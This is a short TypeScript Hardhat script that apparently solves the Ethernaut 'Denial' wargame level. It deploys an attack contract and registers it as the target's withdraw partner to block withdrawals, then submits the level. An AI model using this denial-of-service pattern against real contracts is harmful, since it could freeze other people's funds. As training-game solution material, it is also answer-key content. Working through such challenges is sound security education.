import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Denial } from '../typechain-types/Denial'
import { DenialAttack } from '../typechain-types/DenialAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0xf1D573178225513eDAA795bE9206f7E311EeDEc3'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Denial', levelAddress, signer, {
    value: ethers.utils.parseEther('0.001'),
  })) as Denial
  const attackContract = (await loadOrDeployContract('DenialAttack', [], signer)) as DenialAttack

  const tx = await targetContract.setWithdrawPartner(attackContract.address)
  console.log(`tx hash ${tx.hash}`)
  await tx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
